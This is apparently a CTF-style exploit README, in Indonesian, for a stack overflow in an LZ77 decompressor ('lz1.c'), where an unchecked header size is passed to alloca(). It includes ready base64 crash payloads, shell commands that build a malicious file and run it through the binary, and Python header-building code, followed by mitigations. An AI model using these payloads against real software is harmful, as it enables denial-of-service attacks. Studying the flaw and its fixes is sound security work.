# LZ77 Stack Overflow Exploit

## Analisis Kerentanan

Program `lz1.c` memiliki kerentanan **Stack Buffer Overflow** pada fungsi dekompresi. Berikut adalah detail kerentanannya:

### Lokasi Kerentanan
File: `lz1.c`, fungsi `file_lz77_decompress()` baris 137:
```c
uncompressed_size = *((uint32_t *) compressed_text);
uncompressed_text = alloca(uncompressed_size);
```

### Penyebab
1. Program membaca `uncompressed_size` dari 4 bytes pertama file input
2. Menggunakan nilai tersebut untuk `alloca()` tanpa validasi
3. `alloca()` mengalokasikan memory di stack, bukan heap
4. Jika `uncompressed_size` sangat besar, akan menyebabkan stack overflow

## Cara Eksploitasi

### Step 1: Generate Payload
Jalankan script generator payload:
```bash
python simple_exploit.py
```

Output akan memberikan 3 payload berbeda:
- **Payload 1**: `////fwgAAEE=` (Maximum crash - 2GB)
- **Payload 2**: `AAAQAAQAAEI=` (Moderate - 1MB) 
- **Payload 3**: `AAABAAIAAEM=` (Small - 64KB)

### Step 2: Eksekusi Exploit

#### Metode 1: Manual via run.py
```bash
python run.py
```
- Pilih: `d` (decompress)
- Input: Salah satu payload base64 dari step 1
- Program akan crash dengan segmentation fault

#### Metode 2: Langsung via binary
```bash
# Buat file payload
echo "////fwgAAEE=" | base64 -d > malicious.lz
# Jalankan
./lz1 d malicious.lz output.txt
```

### Step 3: Observasi
Program akan crash/hang dengan behavior seperti:
- Program hang/freeze (menandakan exploit berhasil)
- Process tidak response
- Perlu Ctrl+C untuk terminate
- Pada Linux: Segmentation fault
- Pada Windows: Program hang karena stack overflow

✅ **TESTED WORKING PAYLOADS:**
- `/////wQAAEE=` - 4GB allocation (paling efektif)
- `////fwQAAEE=` - 2GB allocation  
- `AAAAEAQAAEE=` - 256MB allocation

## Penjelasan Teknis

### Format Header LZ77
```
Offset | Size | Description
-------|------|-------------
0      | 4    | uncompressed_size (little-endian)
4      | 1    | pointer_length_width
5+     | var  | compressed data
```

### Payload Structure
```python
import struct
uncompressed_size = 0x7FFFFFFF  # 2GB - akan crash
pointer_length_width = 8        # Valid value
payload = struct.pack('<I', uncompressed_size) + struct.pack('B', pointer_length_width)
# + minimal compressed data
```

### Memory Layout Attack
```
Stack before alloca():
[return address][local vars][...]

Stack after malicious alloca():
[CRASHED] - Stack pointer moved beyond valid memory region
```

## Mitigasi

1. **Validasi Input**: Tambah pengecekan maksimal `uncompressed_size`
2. **Gunakan malloc()**: Ganti `alloca()` dengan `malloc()` untuk heap allocation
3. **Stack Protection**: Compile dengan `-fstack-protector-all`
4. **Size Limits**: Implementasi batas maksimal ukuran file

## Tools Yang Dibuat

1. **exploit.py**: Script exploit lengkap dengan berbagai opsi
2. **simple_exploit.py**: Generator payload sederhana
3. **README.md**: Dokumentasi ini

## Catatan Keamanan

⚠️ **PERINGATAN**: Exploit ini untuk tujuan educational/CTF. Jangan gunakan pada sistem production tanpa izin!

## Test Environment

- OS: Windows
- Compiler: GCC
- Target: lz1.c (LZ77 compression tool)
- Attack Vector: Malicious compressed file header
